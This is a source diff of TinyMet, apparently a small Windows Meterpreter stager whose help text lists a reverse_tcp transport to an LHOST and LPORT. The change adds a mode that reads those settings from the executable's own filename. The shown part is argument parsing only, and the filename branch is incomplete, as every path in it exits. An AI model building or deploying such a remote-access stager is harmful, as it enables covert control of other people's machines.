@@ -48,7 +48,10 @@ unsigned short portnumber;
 unsigned char *buf;
 unsigned int bufsize;
 LPWSTR* arglist;
-char helptext[] = "TinyMet v0.1\nwww.tinymet.com\n\n"
+char* TRANSPORT;
+char* LHOST;
+char* LPORT;
+char helptext[] = "TinyMet v0.2\nwww.tinymet.com\n\n"
 "Usage: tinymet.exe [transport] LHOST LPORT\n"
 "Available transports are as follows:\n"
 "    0: reverse_tcp\n"
@@ -264,34 +267,78 @@ char* wchar_to_char(wchar_t* orig){
 	return nstring;
 };
 
-void parse_arguments() {
+int main()
+{
 	int argsCount;
 
 	arglist = CommandLineToArgvW(GetCommandLineW(), &argsCount);
-	// rudimentary error checking
+
+	// basic error checking
 	if (NULL == arglist) { // problem parsing?
 		err_exit("CommandLineToArgvW & GetCommandLineW");
 	}
-	else if (argsCount == 2 && !wcscmp(arglist[1], L"--help")) { // looking for help?
+
+	// looking for help?
+	if (argsCount == 2 && !wcscmp(arglist[1], L"--help")) { 
 		printf(helptext);
 		exit(-1);
 	}
-	else if (argsCount != 4) { // less than 4 args?
-		printf(helptext);
-		err_exit("Invalid arguments count, should be 4");
+
+	/* PARSING ARGUMENTS */
+	/*
+	Now, we start parsing arguments "transport, lport and lhost";
+	TL;DR version: if argscount is 4, parse from command line, if it's one and there're two underscores in filename, get from filename.
+	
+	Longer version:
+	We have two options:
+	1) they're passed as command line arguments "tinymet.exe 0 host.com 80"; in this case argscount == 4
+	2) they're parsed from the filename "0_host.com_80.exe"; in this case:
+		2.a) argscount == 1, AND
+		2.b) there's two underscores in the name separating arguments
+
+	We'll set the globals "TRANSPORT, LHOST & LPORT accordingly
+	*/
+
+	// Case 1: "tinymet.exe 0 host.exe 80"
+	if (argsCount == 4) { 
+		TRANSPORT = wchar_to_char(arglist[1]);
+		LHOST = wchar_to_char(arglist[2]);
+		LPORT = wchar_to_char(arglist[3]);
 	}
-	//char* filename = wchar_to_char(arglist[0]);
-	//filename = strrchr(filename, '\\') + 1;
 
-};
+	// Case 2: "0_host.com_80.exe"
+	else if (argsCount == 1) {
+		wchar_t* filename;
+		wchar_t* firstunderscore;
+		wchar_t* lastunderscore;
+		wchar_t* lastdot;
 
-int main()
-{
-	parse_arguments();
-	// convert wchar_t to mb
-	char* TRANSPORT = wchar_to_char(arglist[1]);
-	char* LHOST = wchar_to_char(arglist[2]);
-	char* LPORT = wchar_to_char(arglist[3]);
+		filename = arglist[0]; // that's gonna be the full path of the filename "drive:\\path\\0_host.com_port.exe"
+		filename = wcsrchr(filename, '\\') + 1; // now we removed the path, and left only with the filename "0_host.com_port.exe"
+
+		lastdot = wcsrchr(filename, '.');	// get last . before .exe extension
+		*lastdot = '\0';					// now we null-terminated filename string at last dot, effectively removing extension
+											// now filename is going to be "0_host.com_port"
+
+		firstunderscore = wcschr(filename, '_'); // == NULL if no underscores at all in filename
+		if (!firstunderscore) {
+			printf(helptext);
+			exit(-1);
+		}
+
+		lastunderscore = wcschr(firstunderscore + 1, '_'); // == NULL if there's no OTHER underscore after the first one
+		if (!lastunderscore) { // no _ and argscount == 1?
+			printf(helptext);
+			exit(-1);
+		}
+		// Case 3: something else ...
+		else {
+			printf(helptext);
+			exit(-1);
+		}
+
+
+	}
 
 	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);
 
